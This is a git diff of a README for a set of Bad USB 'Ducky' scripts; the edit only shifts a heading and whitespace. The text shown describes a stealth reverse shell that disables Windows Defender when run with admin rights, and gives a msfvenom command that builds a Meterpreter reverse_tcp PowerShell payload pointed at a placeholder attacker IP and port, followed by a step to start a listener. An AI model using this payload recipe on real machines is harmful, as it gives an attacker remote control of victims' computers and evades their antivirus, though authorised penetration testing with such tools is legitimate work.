@@ -1,9 +1,9 @@
 # Various Ducky scripts for Bad USBs
-### Can be used for pentesting or administrative tasks.
+### Can be used for pentesting or administrative tasks. 
+# On The Attacker's Machine
 ### Below text applies to the stealth reverse shell.
 ### Requires Admin privileges to disable Defender. Otherwide payload may be detected.
-### Tested on Windows 11 Home 
-# On The Attacker's Machine
+### Tested on Windows 11 Home
 ### Create the payload with msfvenom<br/> 
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=AttacksersIP LPORT=AttackersPort -f psh -o PAYLOAD.ps1<br/>
 ### Open msfconsole and start listener<br/>
